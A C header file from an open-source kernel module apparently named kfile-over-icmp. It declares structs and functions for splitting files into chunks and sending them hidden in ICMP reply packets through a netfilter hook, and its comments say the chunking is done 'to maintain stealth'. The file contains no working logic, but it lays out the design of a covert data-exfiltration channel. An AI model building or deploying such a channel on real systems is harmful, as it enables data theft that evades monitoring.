/**
 * This file is part of the kfile-over-icmp module (https://github.com/spiderpig1297/kfile-over-icmp).
 * Copyright (c) 2020 spiderpig1297.
 * 
 * This program is free software: you can redistribute it and/or modify  
 * it under the terms of the GNU General Public License as published by  
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but 
 * WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU 
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License 
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#pragma once

#include "../net/netfilter.h"

static size_t DEFAULT_PAYLOAD_CHUNKS_SIZE = 32;  // in bytes
static const char DEFAULT_NEW_FILE_SIGNATURE[] = { 0xDE, 0xAD, 0xBE, 0xEF };

/**
 * struct for storing file's signature.
 * each file sent by the module is marked by this struct, which contains the file
 * size and a unique signature. this struct will then be used when parsing the ICMP 
 * packets to differentiate between the sent files.
 */
struct new_file_signature {
    const char signature[4];
    size_t file_size;
    // TODO: add an id for the file? to recognize it?
};

/**
 * struct for storing chunks.
 * in order to maximize on performance and to maintain stealth, each file is splitted
 * to chunks, each chunk limited by the size DEFAULT_PAYLOAD_CHUNKS_SIZE.
 * get_payload is the function responsible for handing the chunks to the netfilter 
 * hook, where each chunk will be sent on top of a single ICMP-reply packet.
 */
struct file_chunk {
    const char *data;
    size_t chunk_size;
    struct list_head l_head;
};

/**
 * NOTE: assumes that buffer was already allocated by the caller and with sufficient size.
 */
int generate_payload(char *buffer, size_t *length);

void setup_payload_generator(void);

size_t get_default_payload_chunk_size(void);
